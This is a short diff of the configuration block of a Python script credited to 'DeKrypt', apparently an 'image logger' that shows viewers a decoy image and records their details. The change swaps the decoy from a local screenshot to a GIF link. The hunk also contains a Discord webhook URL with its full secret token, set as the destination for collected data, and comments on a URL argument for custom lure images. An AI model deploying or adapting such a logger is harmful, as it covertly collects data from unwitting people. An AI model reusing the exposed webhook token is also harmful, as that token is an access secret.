@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1347206698766438542/gnlPhAt3Lpd2sq3qgoAvFNzDUsXsC0Tj2joLcb79t-rLgL2i2X2vgcdD0-9M8Yhj8Giv",
-    "image": "file:///C:/Users/User/OneDrive/%D0%9A%D0%B0%D1%80%D1%82%D0%B8%D0%BD%D0%B8/%D0%95%D0%BA%D1%80%D0%B0%D0%BD%D0%BD%D0%B8%20%D1%81%D0%BD%D0%B8%D0%BC%D0%BA%D0%B8/Screenshot%202025-03-02%20214026.png", # You can also have a custom image by using a URL argument
+    "image": "https://www.gifcen.com/wp-content/uploads/2021/11/nle-choppa-gif-2.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
